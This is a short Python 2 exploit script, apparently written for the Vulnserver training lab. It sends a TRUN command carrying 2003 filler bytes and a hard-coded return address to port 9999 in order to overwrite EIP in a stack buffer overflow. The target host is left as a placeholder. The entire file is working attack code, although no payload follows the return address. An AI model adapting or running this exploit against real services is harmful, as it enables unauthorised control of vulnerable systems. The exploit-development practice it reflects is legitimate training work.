#!/usr/bin/python
import sys, socket

return_address = "\xaf\x11\x50\x62"

# EIP starts with 2003 bytes
shellcode = "A" * 2003 + return_address

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("YOUR_IP_ADDRESS", 9999))
    s.send(('TRUN /.:/' + shellcode))
    s.close()
except:
    print "Error connecting to server"
    sys.exit()
